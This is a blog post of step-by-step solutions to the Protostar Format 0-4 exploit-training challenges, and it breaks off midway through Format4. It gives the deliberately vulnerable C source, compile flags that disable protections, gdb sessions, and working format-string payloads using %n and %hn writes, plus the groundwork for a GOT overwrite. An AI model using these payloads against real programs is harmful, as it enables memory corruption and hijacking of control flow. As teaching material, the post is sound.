---
title: Protostar Format 0-4 Solutions
layout: post
date: '2021-03-30 15:46:51'
---

I'd like to share my solutions of Protostar Format challenges as a big blog post. I'll adjust this one asap...

You can also find them on the link below.
[https://github.com/cemonatk/pwn-exercises](https://github.com/cemonatk/pwn-exercises)

## Protostar-Format0 Solution

### 1. Introduction

This is a poc solution for the "Format0" challenge of Protostar. It's short and hopefully it's easy for everyone who wants to have a look.

Source:
[https://web.archive.org/web/20170419081926/https://exploit-exercises.com/protostar/format0/](https://web.archive.org/web/20170419081926/https://exploit-exercises.com/protostar/format0/) 
 
**Hints:**
* This level should be done in less than 10 bytes of input.
* “Exploiting format string vulnerabilities”

#### 1.1 Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

#### 1.2 Compilation

Terminal command to compile with debug symbols + without pie + Disable canaries + Disable ASLR + for x86:

```js
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

gcc -o format_0 format_0.c -z execstack -fno-stack-protector -m32 -no-pie -g
```

### 2. Solution 

#### 2.1 Short Analysis with gdb-peda

1. Silently (-q) start with gdb.
2. Disassemble the main function.
3. Checking target function (win).


```nasm
0x08048498 <+20>:	call   0x804844d <vuln>
```
The instruction above can be found in **disassemble main** command output.
```nasm
gdb-peda$ disas 0x804844d
Dump of assembler code for function vuln:
   0x0804844d <+0>:	push   ebp
   0x0804844e <+1>:	mov    ebp,esp
   0x08048450 <+3>:	sub    esp,0x68
   0x08048453 <+6>:	mov    DWORD PTR [ebp-0xc],0x0
   0x0804845a <+13>:	mov    eax,DWORD PTR [ebp+0x8]
   0x0804845d <+16>:	mov    DWORD PTR [esp+0x4],eax
   0x08048461 <+20>:	lea    eax,[ebp-0x4c]
   0x08048464 <+23>:	mov    DWORD PTR [esp],eax
   0x08048467 <+26>:	call   0x8048340 <sprintf@plt>
   0x0804846c <+31>:	mov    eax,DWORD PTR [ebp-0xc]
   0x0804846f <+34>:	cmp    eax,0xdeadbeef
   0x08048474 <+39>:	jne    0x8048482 <vuln+53>
   0x08048476 <+41>:	mov    DWORD PTR [esp],0x8048530
   0x0804847d <+48>:	call   0x8048310 <puts@plt>
   0x08048482 <+53>:	leave  
   0x08048483 <+54>:	ret    
End of assembler dump.
```

```nasm
0x0804846f <+34>:	cmp    eax,0xdeadbeef
```

As seen above, compares the value on eax register. If it is not equal to **0xdeadbeef** it jumps to **\<vuln+53\>** (leave instruction) otherwise it continues and prints out the message.

Let's have fun a bit and set the value on **eax** to **0xdeadbeef** manualy :)

```nasm
gdb-peda$ b * 0x0804846f
Breakpoint 1 at 0x804846f: file format_0.c, line 15.

gdb-peda$ r
Starting program: format_0
...TRIM...
[-------------------------------------code-------------------------------------]
   0x8048464 <vuln+23>:	mov    DWORD PTR [esp],eax
   0x8048467 <vuln+26>:	call   0x8048340 <sprintf@plt>
   0x804846c <vuln+31>:	mov    eax,DWORD PTR [ebp-0xc]
=> 0x804846f <vuln+34>:	cmp    eax,0xdeadbeef
...TRIM...
gdb-peda$ set $eax = 0xdeadbeef
gdb-peda$ c
Continuing.
you have hit the target correctly :)
[Inferior 1 (process 2629) exited with code 045]
Warning: not running
```


#### 2.2 Quick Solution
 
Let's find the offset; 

```
gdb-peda$ r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

gdb-peda$ i r eax eip ebp
eax            0x63413163	-> 64
eip            0x37634136	-> 80
ebp            0x63413563	-> 76
```

we are able to overwrite eax after 64 junk bytes then our final payload will be:
```
$(python -c 'print "A" * 64 + "\xef\xbe\xad\xde"')
```

#### 2.3 Final PoC

Because of the format string vulnerability it's possible to add 64 padding by using the following as well... 
```
$ ./format_0 $(python -c "print '%64d\xef\xbe\xad\xde'")
you have hit the target correctly :)
```


## Protostar-Format1 Solution

### 1. Introduction

This is a poc solution for the "Format1" challenge of Protostar. It's short and hopefully it's easy for everyone who wants to have a look.

Source:
[https://web.archive.org/web/20170419031451/https://exploit-exercises.com/protostar/format1/](https://web.archive.org/web/20170419031451/https://exploit-exercises.com/protostar/format1/) 
 
**Hints:**
* This level shows how format strings can be used to modify arbitrary memory locations.

* objdump -t is your friend, and your input string lies far up the stack :)

#### 1.1 Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln(char *string)
{
  printf(string);
  
  if(target) {
      printf("you have modified the target :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

#### 1.2 Compilation

Terminal command to compile with debug symbols + without pie + Disable canaries + Disable ASLR + for x86:

```js
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

gcc -o format_1 format_1.c -z execstack -fno-stack-protector -m32 -no-pie -g
```

### 2. Solution 

#### 2.1 Short Analysis with gdb

1. Silently (-q) start with gdb.
2. Disassemble the main and vuln functions.
3. Check address of the target variable.

It's not easy to overwrite target variable since it's far away from stack as mentioned on "Hints".

```nasm
(gdb) disas main
Dump of assembler code for function main:
   0x08048475 <+0>:	push   ebp
   0x08048476 <+1>:	mov    ebp,esp
   0x08048478 <+3>:	and    esp,0xfffffff0
   0x0804847b <+6>:	sub    esp,0x10
   0x0804847e <+9>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048481 <+12>:	add    eax,0x4
   0x08048484 <+15>:	mov    eax,DWORD PTR [eax]
   0x08048486 <+17>:	mov    DWORD PTR [esp],eax
   0x08048489 <+20>:	call   0x804844d <vuln>
   0x0804848e <+25>:	leave  
   0x0804848f <+26>:	ret    
End of assembler dump.
(gdb) disas vuln
Dump of assembler code for function vuln:
   0x0804844d <+0>:	push   ebp
   0x0804844e <+1>:	mov    ebp,esp
   0x08048450 <+3>:	sub    esp,0x18
   0x08048453 <+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048456 <+9>:	mov    DWORD PTR [esp],eax
   0x08048459 <+12>:	call   0x8048310 <printf@plt>
   0x0804845e <+17>:	mov    eax,ds:0x804a028
   0x08048463 <+22>:	test   eax,eax
   0x08048465 <+24>:	je     0x8048473 <vuln+38>
   0x08048467 <+26>:	mov    DWORD PTR [esp],0x8048520
   0x0804846e <+33>:	call   0x8048320 <puts@plt>
   0x08048473 <+38>:	leave  
   0x08048474 <+39>:	ret    
End of assembler dump.
(gdb) b main
(gdb) r aaaaaa
Starting program: format_1 aaaaaa
Breakpoint 1, main (argc=2, argv=0xffffd194) at format_1.c:19
19	  vuln(argv[1]);

(gdb) i address target
Symbol "target" is static storage at address 0x804a028.
```

Target address in the little-endian format = **\x28\xa0\x04\x08**

Let's check what happens if we modify the program flow.

```nasm
$ gdb -q format_1
Reading symbols from format_1...done.
(gdb) b *0x0804845e
Breakpoint 1 at 0x804845e: file format_1.c, line 12.
(gdb) r AAAAAA
Starting program:format_1 AAAAAA

Breakpoint 1, vuln (string=0xffffd38e "AAAAAA") at format_1.c:12
12	  if(target) {
(gdb) si
0x08048463	12	  if(target) {
(gdb) disas
Dump of assembler code for function vuln:
   0x0804844d <+0>:	push   ebp
   0x0804844e <+1>:	mov    ebp,esp
   0x08048450 <+3>:	sub    esp,0x18
   0x08048453 <+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08048456 <+9>:	mov    DWORD PTR [esp],eax
   0x08048459 <+12>:	call   0x8048310 <printf@plt>
   0x0804845e <+17>:	mov    eax,ds:0x804a028
=> 0x08048463 <+22>:	test   eax,eax
   0x08048465 <+24>:	je     0x8048473 <vuln+38>
   0x08048467 <+26>:	mov    DWORD PTR [esp],0x8048520
   0x0804846e <+33>:	call   0x8048320 <puts@plt>
   0x08048473 <+38>:	leave  
   0x08048474 <+39>:	ret    
End of assembler dump.
(gdb)  set $eax=1
(gdb) i r eax
eax            0x1	1
(gdb) c
Continuing.
AAAAAAyou have modified the target :)
[Inferior 1 (process 3336) exited with code 040]
```

It's also possible to manipulate flags or editing binary itself via hex editor...

#### 2.2 Quick Solution
 
We found that **\x28\xa0\x04\x08** is the target variable address.

Our plan is to overwrite values on the target variable address. Let's start by checking offset, I went with blackbox approach this time since I did whitebox on stack solutions enough.

The input parameter of printf() is stored on the stack, but it's not in the same stack frame. 
It's obvious that there is a format string vulnerability as seen the output below:

```
$ ./format_1 aaaaaaaaaaaa
aaaaaaaaaaaa
$ ./format_1 %d
47
```

If the string contains a format specifier, then argument is fetched from stack. 
Let's find the offset by increasing the number of inputs until we see our input.

```
$ ./format_1 $(python -c 'print "AAAAAA"+"%x|"*200' ) | grep 41414141
AAAAAA2f|804a000|80484e2|2|ffffcf74|ffffced8|804848e|ffffd148|f7ffd000|804849b|f7fbc000|8048490|0|0|f7e2bad3|2|ffffcf74|ffffcf80|f7feae6a|2|ffffcf74|ffffcf14|804a018|804822c|f7fbc000|0|0|0|1e9576cb|247d92db|0|0|0|2|8048350|0|f7ff0660|f7e2b9e9|f7ffd000|2|8048350|0|8048371|8048475|2|ffffcf74|8048490|8048500|f7feb300|ffffcf6c|1c|2|ffffd13d|ffffd148|0|ffffd3a7|ffffd3b2|ffffd3c4|ffffd3da|ffffd3eb|ffffd418|ffffd435|ffffd444|ffffd479|ffffd484|ffffd494|ffffd4ab|ffffd4bc|ffffd4ce|ffffd512|ffffd546|ffffd575|ffffd57c|ffffda9d|ffffdad7|ffffdb0b|ffffdb3b|ffffdb8d|ffffdbc0|ffffdc04|ffffdc62|ffffdc79|ffffdc8b|ffffdcac|ffffdcb5|ffffdcd3|ffffdce7|ffffdcfe|ffffdd0f|ffffdd1e|ffffdd54|ffffdd66|ffffdd83|ffffdd95|ffffddaf|ffffddbe|ffffddcb|ffffddd3|ffffdde2|ffffde0e|ffffde18|ffffde32|ffffde81|ffffde93|ffffdecf|ffffdeef|ffffdef9|ffffdf0e|ffffdf2d|ffffdf38|ffffdf52|ffffdf65|ffffdf87|ffffdfa8|ffffdfc1|ffffdfe0|0|20|f7fdacd0|21|f7fda000|10|1f8bfbff|6|1000|11|64|3|8048034|4|20|5|9|7|f7fdc000|8|0|9|8048350|b|3e8|c|3e8|d|3e8|e|3e8|17|0|19|ffffd11b|1f|ffffdfed|f|ffffd12b|0|0|a000000|5bad0c9a|5b9a7084|fa07f5bd|6973cada|363836|0|0|0|662f2e00|616d726f|315f74===>|41414141| <===78254141|7c78257c|257c7825|78257c78|7c78257c|257c7825|78257c78|7c78257c|257c7825|78257c78|7c78257c|257c7825|78257c78|7c78257c|257c7825|78257c78|7c78257c|257c7825|78257c78|7c78257c|257c7825|78257c78|7c78257c|257c7825|78257c78|7c78257c|257c7825|78257c78|7c78257c|257c7825|
```

Okay, whether I changed number of %x format specifier, it was not helpful. So I used following to find right value.

```
$ ./format_1 $(python -c 'print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"+"%x|"*181' )
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH2f|804a000|80484e2|2|ffffcf74|ffffced8|804848e|ffffd158|f7ffd000|804849b|f7fbc000|8048490|0|0|f7e2bad3|2|ffffcf74|ffffcf80|f7feae6a|2|ffffcf74|ffffcf14|804a018|804822c|f7fbc000|0|0|0|a1424fd9|9baaabc9|0|0|0|2|8048350|0|f7ff0660|f7e2b9e9|f7ffd000|2|8048350|0|8048371|8048475|2|ffffcf74|8048490|8048500|f7feb300|ffffcf6c|1c|2|ffffd14d|ffffd158|0|ffffd398|ffffd3a3|ffffd3b5|ffffd3cb|ffffd3dc|ffffd409|ffffd426|ffffd435|ffffd46a|ffffd475|ffffd485|ffffd49c|ffffd4ad|ffffd4bf|ffffd503|ffffd537|ffffd566|ffffd56d|ffffda8e|ffffdac8|ffffdafc|ffffdb2c|ffffdb7e|ffffdbb1|ffffdbf5|ffffdc53|ffffdc6a|ffffdc7c|ffffdc9d|ffffdca6|ffffdcc4|ffffdcd8|ffffdcef|ffffdd00|ffffdd0f|ffffdd45|ffffdd57|ffffdd74|ffffdd86|ffffdda0|ffffddaf|ffffddbc|ffffddc4|ffffddd3|ffffddff|ffffde09|ffffde23|ffffde72|ffffde84|ffffdec0|ffffdee0|ffffdeea|ffffdeff|ffffdf1e|ffffdf29|ffffdf43|ffffdf56|ffffdf78|ffffdf99|ffffdfb2|ffffdfd1|ffffdfe0|0|20|f7fdacd0|21|f7fda000|10|1f8bfbff|6|1000|11|64|3|8048034|4|20|5|9|7|f7fdc000|8|0|9|8048350|b|3e8|c|3e8|d|3e8|e|3e8|17|0|19|ffffd12b|1f|ffffdfed|f|ffffd13b|0|0|0|0|0|a000000|c782b05e|f9132f6f|c100e28a|697e9cad|363836|0|0|0|662f2e00|616d726f|315f74|41414141|42424242|43434343|44444444|45454545|46464646|47474747|48484848|
```

Now, let's use %n format specifier instead of %x to write. It is used to get the number of characters before **%n**.
Following info is from printf(3)'s manual page.

```
n      The number of characters written so far is stored into the integer indicated by the int * (or variant) pointer argument.  No argument is converted.
```
```
$ ./format_1 $(python -c 'print "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH"+"%x|"*181' )
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH2f|804a000|80484e2|2|ffffcf74|ffffced8|804848e|ffffd158|f7ffd000|804849b|f7fbc000|8048490|0|0|f7e2bad3|2|ffffcf74|ffffcf80|f7feae6a|2|ffffcf74|ffffcf14|804a018|804822c|f7fbc000|0|0|0|a1424fd9|9baaabc9|0|0|0|2|8048350|0|f7ff0660|f7e2b9e9|f7ffd000|2|8048350|0|8048371|8048475|2|ffffcf74|8048490|8048500|f7feb300|ffffcf6c|1c|2|ffffd14d|ffffd158|0|ffffd398|ffffd3a3|ffffd3b5|ffffd3cb|ffffd3dc|ffffd409|ffffd426|ffffd435|ffffd46a|ffffd475|ffffd485|ffffd49c|ffffd4ad|ffffd4bf|ffffd503|ffffd537|ffffd566|ffffd56d|ffffda8e|ffffdac8|ffffdafc|ffffdb2c|ffffdb7e|ffffdbb1|ffffdbf5|ffffdc53|ffffdc6a|ffffdc7c|ffffdc9d|ffffdca6|ffffdcc4|ffffdcd8|ffffdcef|ffffdd00|ffffdd0f|ffffdd45|ffffdd57|ffffdd74|ffffdd86|ffffdda0|ffffddaf|ffffddbc|ffffddc4|ffffddd3|ffffddff|ffffde09|ffffde23|ffffde72|ffffde84|ffffdec0|ffffdee0|ffffdeea|ffffdeff|ffffdf1e|ffffdf29|ffffdf43|ffffdf56|ffffdf78|ffffdf99|ffffdfb2|ffffdfd1|ffffdfe0|0|20|f7fdacd0|21|f7fda000|10|1f8bfbff|6|1000|11|64|3|8048034|4|20|5|9|7|f7fdc000|8|0|9|8048350|b|3e8|c|3e8|d|3e8|e|3e8|17|0|19|ffffd12b|1f|ffffdfed|f|ffffd13b|0|0|0|0|0|a000000|c782b05e|f9132f6f|c100e28a|697e9cad|363836|0|0|0|662f2e00|616d726f|315f74|41414141|42424242|43434343|44444444|45454545|46464646|47474747|48484848|

$ ./format_1 $(python -c 'print "AAAABBBBCCCCDDDDEEEEFFFFGGGG" + "\x28\xa0\x04\x08" + "%x|"*181 + "%n"' )
```

It did not work after severak attempts and analysis then I switched back to ubuntu 20.04 again;

```
$ objdump -t ./format_1 | grep target
0804c024 g     O .bss	00000004              target

gdb-peda$ r $(python -c 'print "A"*8+"\x24\xc0\x04\x08"+"A"*8+"%175$x"')
Starting program: format_1 $(python -c 'print "A"*8+"\x24\xc0\x04\x08"+"A"*8+"%175$x"')
AAAAAAAA$AAAAAAAA804c024[Inferior 1 (process 8049) exited normally]
```

#### 2.3 Final PoC

```
$(python -c 'print "\x24\xc0\x04\x08"+"%166$x"')
$804c024

$(python -c 'print "\x24\xc0\x04\x08"+"%166$n"')
$you have modified the target :)
 ```


## Protostar-Format2 Solution

### 1. Introduction

This is a poc solution for the "Format2" challenge of Protostar. It's short and hopefully it's easy for everyone who wants to have a look.

Source:
[https://web.archive.org/web/20170419023621/https://exploit-exercises.com/protostar/format2/](https://web.archive.org/web/20170419023621/https://exploit-exercises.com/protostar/format2/) 
 
**Hints:**
* This level moves on from format1 and shows how specific values can be written in memory.

#### 1.1 Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);
  printf(buffer);
  
  if(target == 64) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %d :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

#### 1.2 Compilation

Terminal command to compile with debug symbols + without pie + Disable canaries + Disable ASLR + for x86:

```js
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

gcc -o format_2 format_2.c -z execstack -fno-stack-protector -m32 -no-pie -g
```

### 2. Solution 

#### 2.1 Short Analysis with gdb-peda

Similar to the previous one, we just need to write a custom value onto the target value address.

```nasm
gdb-peda$ disas vuln
Dump of assembler code for function vuln:
   0x0804849d <+0>:	push   ebp
   0x0804849e <+1>:	mov    ebp,esp
   0x080484a0 <+3>:	sub    esp,0x218
   0x080484a6 <+9>:	mov    eax,ds:0x804a028
   0x080484ab <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484af <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484b7 <+26>:	lea    eax,[ebp-0x208]
   0x080484bd <+32>:	mov    DWORD PTR [esp],eax
   0x080484c0 <+35>:	call   0x8048360 <fgets@plt>
   0x080484c5 <+40>:	lea    eax,[ebp-0x208]
   0x080484cb <+46>:	mov    DWORD PTR [esp],eax
   0x080484ce <+49>:	call   0x8048350 <printf@plt>
   0x080484d3 <+54>:	mov    eax,ds:0x804a030
   0x080484d8 <+59>:	cmp    eax,0x40
   0x080484db <+62>:	jne    0x80484eb <vuln+78>
   0x080484dd <+64>:	mov    DWORD PTR [esp],0x80485a0
   0x080484e4 <+71>:	call   0x8048370 <puts@plt>
   0x080484e9 <+76>:	jmp    0x8048500 <vuln+99>
   0x080484eb <+78>:	mov    eax,ds:0x804a030
   0x080484f0 <+83>:	mov    DWORD PTR [esp+0x4],eax
   0x080484f4 <+87>:	mov    DWORD PTR [esp],0x80485c0
   0x080484fb <+94>:	call   0x8048350 <printf@plt>
   0x08048500 <+99>:	leave  
   0x08048501 <+100>:	ret    
End of assembler dump.
```

```
$ objdump -t format_2 | grep target
0804a030 g     O .bss	00000004              target
```

So, target is on **0804a030**. We need to overwrite this variable with 64 since the following one compares if value is 0x40 or not.

```nasm
gdb-peda$ disas vuln
...TRIM...
0x080484d3 <+54>:	mov    eax,ds:0x804a030
0x080484d8 <+59>:	cmp    eax,0x40
...TRIM...

gdb-peda$ x/wx 0x804a030
0x804a030 <target>:

gdb-peda$ x/wx &target
0x804a030 <target>:	

gdb-peda$ p/x 64 
$1 = 0x40
```

#### 2.2 Quick Solution

So our payload will start with the address of target value in little-endian format, then we need to pop stack for 60 bytes as well (4+60 = 64).
Then we need to use %n to write on the address.

```nasm
gdb-peda$ b * 0x080484d3
gdb-peda$ r <<< $(python -c 'print "\x30\xa0\x04\x08%60x%4$n"')

gdb-peda$ disas
...TRIM...
=> 0x080484d3 <+54>:	mov    eax,ds:0x804a030
...TRIM...

gdb-peda$ i r eax
eax            0x41	0x41

gdb-peda$ c
Continuing.
you have modified the target :)
[Inferior 1 (process 3681) exited with code 040]
Warning: not running
```

#### 2.3 Final PoC

```
$ echo -ne $(python -c 'print "\x30\xa0\x04\x08%60x%4$n"') | ./format_2
0�                                                         200you have modified the target :)
```


## Protostar-Format3 Solution

### 1. Introduction

This is a poc solution for the "Format3" challenge of Protostar. It's short and hopefully it's easy for everyone who wants to have a look.

Source:
[https://web.archive.org/web/20170417130413/https://exploit-exercises.com/protostar/format3/](https://web.archive.org/web/20170417130413/https://exploit-exercises.com/protostar/format3/) 
 
**Hints:**
* This level advances from format2 and shows how to write more than 1 or 2 bytes of memory to the process.
* This also teaches you to carefully control what data is being written to the process memory.

#### 1.1 Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void printbuffer(char *string)
{
  printf(string);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printbuffer(buffer);
  
  if(target == 0x01025544) {
      printf("you have modified the target :)\n");
  } else {
      printf("target is %08x :(\n", target);
  }
}

int main(int argc, char **argv)
{
  vuln();
}
```

#### 1.2 Compilation

Terminal command to compile with debug symbols + without pie + Disable canaries + Disable ASLR + for x86:

```js
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

gcc -o format_3 format_3.c -z execstack -fno-stack-protector -m32 -no-pie -g
```

### 2. Solution 

#### 2.1 Short Analysis with gdb-peda

```nasm
gdb-peda$ disas vuln
Dump of assembler code for function vuln:
   0x080484b0 <+0>:	push   ebp
   0x080484b1 <+1>:	mov    ebp,esp
   0x080484b3 <+3>:	sub    esp,0x218
   0x080484b9 <+9>:	mov    eax,ds:0x804a028
   0x080484be <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x080484c2 <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x080484ca <+26>:	lea    eax,[ebp-0x208]
   0x080484d0 <+32>:	mov    DWORD PTR [esp],eax
   0x080484d3 <+35>:	call   0x8048360 <fgets@plt>
   0x080484d8 <+40>:	lea    eax,[ebp-0x208]
   0x080484de <+46>:	mov    DWORD PTR [esp],eax
   0x080484e1 <+49>:	call   0x804849d <printbuffer>
   0x080484e6 <+54>:	mov    eax,ds:0x804a030
   0x080484eb <+59>:	cmp    eax,0x1025544
   0x080484f0 <+64>:	jne    0x8048500 <vuln+80>
   0x080484f2 <+66>:	mov    DWORD PTR [esp],0x80485c0
   0x080484f9 <+73>:	call   0x8048370 <puts@plt>
   0x080484fe <+78>:	jmp    0x8048515 <vuln+101>
   0x08048500 <+80>:	mov    eax,ds:0x804a030
   0x08048505 <+85>:	mov    DWORD PTR [esp+0x4],eax
   0x08048509 <+89>:	mov    DWORD PTR [esp],0x80485e0
   0x08048510 <+96>:	call   0x8048350 <printf@plt>
   0x08048515 <+101>:	leave  
   0x08048516 <+102>:	ret    
End of assembler dump.

$ objdump -t format_3 | grep target
0804a030 g     O .bss	00000004              target
```

It's similar to previous one but this time we need to write a value **(0x1025544)** onto target variable.

```nasm
0x080484e6 <+54>:	mov    eax,ds:0x804a030
0x080484eb <+59>:	cmp    eax,0x1025544
```

#### 2.2 Quick Solution

Let's by calculating the offset between the parameters of printf and the string when it's called.

```nasm
gdb-peda$ disas printbuffer
Dump of assembler code for function printbuffer:
   0x0804849d <+0>:	push   ebp
   0x0804849e <+1>:	mov    ebp,esp
   0x080484a0 <+3>:	sub    esp,0x18
   0x080484a3 <+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x080484a6 <+9>:	mov    DWORD PTR [esp],eax
   0x080484a9 <+12>:	call   0x8048350 <printf@plt>
   0x080484ae <+17>:	leave  
   0x080484af <+18>:	ret

gdb-peda$ b*0x080484a9
Breakpoint 4 at 0x80484a9: file format_3.c, line 10.

gdb-peda$ r
Starting program: format_3 
AAAA

gdb-peda$ x/wx $esp
0xffffced0:	0xffffcf00

gdb-peda$ p/d (0xffffcf00 - 0xffffced0) / 4
$15 = 12
```

Okay it's 12, it's possible to validate by select 12th argument via **$** as well.

```
$ ./format_3
AAAA%12$x                     
AAAA41414141
target is 00000000 :(
```

There are several methods such as writing one byte each time but I'd like to use short writes method.
This method (short int types: the '%hn') helps to write an address in just two writes.

The following quote is from a pdf which was published after a CCC talk.
[https://koeln.ccc.de/archiv/congress/17c3-2000/formatstring/shortwrite.html](https://koeln.ccc.de/archiv/congress/17c3-2000/formatstring/shortwrite.html)
[https://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf](https://crypto.stanford.edu/cs155old/cs155-spring08/papers/formatstring-1.2.pdf)

> The ‘h’ can be used in other format parameters too, to cast the value supplied on the stack to a short type. The short write technique has
one advantage over the first technique: It does not destroy data beside the address, so if there is valueable data behind the address you are overwriting, such as a function parameter, it is preserved.  This does not work on old GNU C libraries (libc5). Also it consumes more memory in the target process.


Target address: **0804a030**
Target value: **0x1025544**

Let's split **0x1025544** into **0x0102** and **0x5544**.

0x0102 in decimal: **258** 
0x5544 in decimal: **21828**

So we will write the following:

1. **21828** to **0804a030**
2. **258** to **0804a032**

So let's structure our payload step by step.

1. Target address and address+2: 
    
    **"\x32\xa0\x04\x08\x30\xa0\x04\x08"**

2. We need to write on to target but %n gets number of bytes before it. So, let's pad 250 times (**%250d**) **258-8= 250**:

    **"\x32\xa0\x04\x08\x30\xa0\x04\x08%250d"**

3. Our buffer starts in the offset 12.

    **"\x32\xa0\x04\x08\x30\xa0\x04\x08%250d%12$hn"**

4. Then we need to overwrite second half of our target address. So, padding will be: **21828 - 258 = 21570**:

    **"\x32\xa0\x04\x08\x30\xa0\x04\x08%250d%12$hn%21570d"**
 
5. Just next to our first half of the payload is 13. By using direct access (**$**) short int write:

    **"\x32\xa0\x04\x08\x30\xa0\x04\x08%250d%12$hn%21570d%13$hn"**


Let's check if it works out or not:

```nasm
gdb-peda$ b*0x080484a9
Breakpoint 1 at 0x80484a9: file format_3.c, line 10.

gdb-peda$ r <<< $(python -c 'print "\x32\xa0\x04\x08\x30\xa0\x04\x08%250d%12$hn%21570d%13$hn"')
...TRIM...

gdb-peda$ b*0x80484ae
Breakpoint 2 at 0x80484ae: file format_3.c, line 11.

gdb-peda$ c
Continuing.

gdb-peda$ disas 
Dump of assembler code for function printbuffer:
   0x0804849d <+0>:	push   ebp
   0x0804849e <+1>:	mov    ebp,esp
   0x080484a0 <+3>:	sub    esp,0x18
   0x080484a3 <+6>:	mov    eax,DWORD PTR [ebp+0x8]
   0x080484a6 <+9>:	mov    DWORD PTR [esp],eax
   0x080484a9 <+12>:	call   0x8048350 <printf@plt>
=> 0x080484ae <+17>:	leave  
   0x080484af <+18>:	ret    
End of assembler dump.

gdb-peda$ print target
$3 = 0x1025544
```
As seen above, **target** variable is overwritten with our target value (**0x1025544**).

#### 2.3 Final PoC

```
python -c 'print "\x32\xa0\x04\x08\x30\xa0\x04\x08%250d%12$hn%21570d%13$hn"' | ./format_3

2�0�                                                                                                                                                                                                                                                -134281632                                                                                                                                                                                                                                                                                                                                  -11900
you have modified the target :)
```


## Protostar-Format4 Solution

### 1. Introduction

This is a poc solution for the "Format4" challenge of Protostar. It's short and hopefully it's easy for everyone who wants to have a look.

Source:
[https://web.archive.org/web/20140811171216/http://exploit-exercises.com/protostar/format4](https://web.archive.org/web/20140811171216/http://exploit-exercises.com/protostar/format4) 
 
**Hints:**
* format4 looks at one method of redirecting execution in a process.
* *objdump -TR is your friend

#### 1.1 Source code
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");
  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);  
}

int main(int argc, char **argv)
{
  vuln();
}
```

#### 1.2 Compilation

Terminal command to compile with debug symbols + without pie + Disable canaries + Disable ASLR + for x86:

```js
sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'

gcc -o format_4 format_4.c -z execstack -fno-stack-protector -m32 -no-pie -g
```

### 2. Solution 

#### 2.1 Short Analysis with gdb-peda

Goal is to print out the following message by exploiting the format string vulnerability.

```nasm
gdb-peda$ disas hello
Dump of assembler code for function hello:
   0x080484fd <+0>:	push   ebp
   0x080484fe <+1>:	mov    ebp,esp
   0x08048500 <+3>:	sub    esp,0x18
   0x08048503 <+6>:	mov    DWORD PTR [esp],0x8048600
   0x0804850a <+13>:	call   0x80483c0 <puts@plt>
   0x0804850f <+18>:	mov    DWORD PTR [esp],0x1
   0x08048516 <+25>:	call   0x80483a0 <_exit@plt>
End of assembler dump.

gdb-peda$ x/s 0x8048600
0x8048600:	"code execution redirected! you win"
```

If we can overwrite the entry of the exit() function in the GOT (Global Offset Table) then we can manipulate program flow therefore hello() function would be called.

```
$ objdump -t ./format_4 | grep hello
080484fd g     F .text	0000001e              hello

$ objdump -TR ./format_4 | grep exit
00000000      DF *UND*	00000000  GLIBC_2.0   _exit
00000000      DF *UND*	00000000  GLIBC_2.0   exit
0804a010 R_386_JUMP_SLOT   _exit
0804a020 R_386_JUMP_SLOT   exit
```

As seen above,
exit() function has an entry in the GOT at **0804a020**.
hello() function has an entry in the GOT at **080484fd**.

#### 2.2 Quick Solution

Let's start by finding the right offset of our input parameter of printf() on the stack by stack popping to manipulate internal stack pointer.

```nasm
gdb-peda$ disas vuln
Dump of assembler code for function vuln:
   0x0804851b <+0>:	push   ebp
   0x0804851c <+1>:	mov    ebp,esp
   0x0804851e <+3>:	sub    esp,0x218
   0x08048524 <+9>:	mov    eax,ds:0x804a030
   0x08048529 <+14>:	mov    DWORD PTR [esp+0x8],eax
   0x0804852d <+18>:	mov    DWORD PTR [esp+0x4],0x200
   0x08048535 <+26>:	lea    eax,[ebp-0x208]
   0x0804853b <+32>:	mov    DWORD PTR [esp],eax
   0x0804853e <+35>:	call   0x80483b0 <fgets@plt>
   0x08048543 <+40>:	lea    eax,[ebp-0x208]
   0x08048549 <+46>:	mov    DWORD PTR [esp],eax
   0x0804854c <+49>:	call   0x8048390 <printf@plt>
   0x08048551 <+54>:	mov    DWORD PTR [esp],0x1
   0x08048558 <+61>:	call   0x80483e0 <exit@plt>
End of assembler dump.
